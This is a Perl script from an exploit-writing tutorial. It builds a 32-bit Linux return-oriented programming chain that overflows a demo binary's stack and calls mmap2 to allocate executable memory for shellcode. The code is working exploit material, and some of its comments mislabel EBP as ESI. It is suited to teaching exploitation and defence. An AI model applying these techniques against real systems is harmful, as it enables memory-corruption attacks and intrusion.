#!/usr/bin/perl

#####################################################################
############ Date: September 18 2015
############ Author: Vincent Dary
############ File: rop_chain_1.pl
############
############ Architecture: Intel x86
############ Plateform: GNU/Linux 32 bits
############
############ Description: 
############ Exploit Writing Tutorial: ROP with Shellcode. 
############ ROP CHAIN 1 memory allocator,
############ based on mmap2 syscall 0xc0.
#####################################################################

use strict;
use warnings;

my $binary_name = "StackBasedOverflow";
my $padding_overflow = 524;
my $buffer = "";

my $ffffffff = "\xff\xff\xff\xff";

# gadgets
my $pop_ebx =     "\xa9\x81\x04\x08";  # 0x080481a9 : pop ebx ; ret
my $pop_ecx =     "\xdf\xb9\x0d\x08";  # 0x080db9df : pop ecx ; ret
my $pop_edx =     "\x4a\xed\x06\x08";  # 0x0806ed4a : pop edx ; ret
my $pop_edi =     "\x80\x84\x04\x08";  # 0x08048480 : pop edi ; ret
my $pop_ebp =     "\xe6\x83\x04\x08";  # 0x080483e6 : pop ebp ; ret
my $pop_eax =     "\x26\x95\x0b\x08";  # 0x080b9526 : pop eax ; ret
my $inc_ebx =     "\x3d\x8b\x0d\x08";  # 0x080d8b3d : inc ebx ; ret
my $inc_edx =     "\xf7\xc9\x05\x08";  # 0x0805c9f7 : inc edx ; ret       
my $inc_ebp =     "\x9c\xc0\x06\x08";  # 0x0806c09c : inc ebp ; ret
my $mov_esi_edx = "\x5f\xc0\x05\x08";  # 0x0805c05f : mov esi, edx ; ret
my $sub_eax_edx = "\x9c\x42\x05\x08";  # 0x0805429c : sub eax, edx ; ret
my $int_80 =      "\x90\xf4\x06\x08";  # 0x0806f490 : int 0x80 ; ret

my $sub_ecx_edx__not_eax__and_eax_ecx      = "\xa2\xc5\x09\x08";  # 0x0809c5a2 : sub ecx, edx ; not eax ; and eax, ecx ; ret
my $sub_edx_eax__mov_eax_edx__sar_eax_0x10 = "\xe3\xc5\x09\x08";  # 0x0809c5e3 : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret


# set the stack padding overflow
$buffer  =  'A' x $padding_overflow;


#********************
# memory allocator
#********************

# mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

# arg1 : unsigned long addr = 0
$buffer .= $pop_ebx;                                # EBX = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_ebx;                                # EBX = 0x00000000

# arg2 : unsigned long len = sizeof(shellcode)
$buffer .= $pop_ecx;                                # ECX = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $pop_edx;                                # EDX = 0xffffff9f
$buffer .= "\x9f\xff\xff\xff";
$buffer .= $sub_ecx_edx__not_eax__and_eax_ecx;      # ECX = 0x00000060

# arg4 : unsigned long flags = MAP_ANONYMOUS|MAP_PRIVATE
$buffer .= $pop_eax;                                # EAX = 0xffffffdd
$buffer .= "\xdd\xff\xff\xff";
$buffer .= $pop_edx;                                # EDX = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $sub_edx_eax__mov_eax_edx__sar_eax_0x10; # EDX = 0x00000034
$buffer .= $mov_esi_edx;

# arg5 : unsigned long fd = -1
$buffer .= $pop_edi;                                # EDI = 0xffffffff
$buffer .= $ffffffff;

# arg6 : unsigned long offset = 0
$buffer .= $pop_ebp;                                # ESI = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_ebp;                                # ESI = 0x00000000

# set the syscall number in EAX
$buffer .= $pop_eax;                                # EAX = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $pop_edx;                                # EDX = 0xffffff3f
$buffer .= "\x3f\xff\xff\xff";
$buffer .= $sub_eax_edx;                            # EAX = 0x000000c0

# arg3 : unsigned long prot = PROT_EXEC|PROT_WRITE
$buffer .= $pop_edx;                                # EDX = 0xffffffff 
$buffer .= $ffffffff;
$buffer .= $inc_edx x 7;                            # EDX = 0x00000006

# perform the mmap2 syscall 
$buffer .= $int_80;                                 # EAX = @new_executable_memory

print $buffer;




